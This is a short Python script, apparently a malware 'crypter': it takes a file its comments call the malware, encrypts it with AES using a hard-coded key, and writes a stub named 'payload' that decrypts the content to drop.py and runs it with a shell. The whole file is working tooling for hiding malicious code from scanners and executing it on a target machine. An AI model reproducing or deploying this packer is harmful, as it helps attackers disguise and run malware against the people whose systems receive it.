#!/usr/bin/env python3
import binascii
import pyaes
import sys, base64
# Open file
file_name = sys.argv[1] # Malware path
new_file_name = "drop.py"  # Path to drop file
file = open(file_name, "rb")
file_data = file.read()
file.close()
# Crypt file data (Using AES)
key = bytearray("0123456789abcdef",'UTF-8')  # 16 bytes key - change for your key
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)
# Create Stub in Python File
stub = "import pyaes\n"
stub += "crypto_data_hex = " + str(crypto_data) + "\n"
stub += "key = " + str(key) + "\n"
stub += "new_file_name = \"" + str(new_file_name) + "\"\n"
stub += """
# Decrypt
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = crypto_data_hex
decrypt_data = aes.decrypt(crypto_data)
# Save file
new_file = open(new_file_name, 'wb')
new_file.write(decrypt_data)
new_file.close()
# Execute file
import subprocess
proc = subprocess.Popen("python3 "+new_file_name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
"""
# Save the Stub
stub_name = "payload"
stub_file = open(stub_name, "w")
stub_file.write(stub)
stub_file.close()